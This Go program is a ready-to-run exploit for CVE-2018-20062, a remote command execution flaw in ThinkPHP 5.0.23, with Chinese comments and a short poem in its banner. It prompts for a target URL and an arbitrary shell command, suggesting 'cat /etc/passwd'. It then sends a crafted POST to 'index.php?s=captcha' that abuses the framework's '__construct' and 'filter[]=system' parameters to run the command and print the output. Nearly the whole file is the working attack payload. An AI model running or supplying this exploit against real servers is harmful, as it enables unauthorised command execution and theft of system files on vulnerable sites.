/*
 * @Author: twsec
 * @Date: 2022-12-24 15:32:16
 * @LastEditors: twsec
 * @LastEditTime: 2022-12-24 16:58:10
 * @Description:thinkphp5.0.23远程命令执行漏洞-EXP
 */
package main

import (
	"fmt"

	"github.com/parnurzeal/gorequest"

	_ "github.com/aloxc/gobanner/banner"
)

func main() {

	//输出多行字符串
	fmt.Println(`CVE-2018-20062-EXP编译合适的版本，根据提示输入地址和命令即可执行命令！
		

		想念你的时候，我会用你的名字喊醒自己。

							--《我想和你叙叙旧》`)

	var Url string
	var Cmd string
	fmt.Println("请输入地址(http://xxxx.xxx/)：")
	fmt.Scanln(&Url)

	fmt.Println("请输入要执行的命令(cat /etc/passwd)：")
	fmt.Scanln(&Cmd)
	gorequestPost(Url, Cmd)
}

// gorequest post请求
func gorequestPost(Url string, Cmd string) {
	Url = Url + "index.php?s=captcha"
	data := "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=" + Cmd
	request := gorequest.New()
	resp, body, errs := request.Post(Url).
		Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8").
		Set("Accept-Encoding", " ").
		Set("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2").
		Set("Content-Type", "application/x-www-form-urlencoded").
		Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0").
		Set("Content-Length", "73").
		Send(data).
		End()
	if errs != nil {
		fmt.Println(errs)
	}
	//如果响应状态码为200，则输出body的类型
	if resp.StatusCode == 200 {

		fmt.Println("命令执行成功！")
		fmt.Println(body)

	} else {
		fmt.Println("命令执行失败！")
	}
}
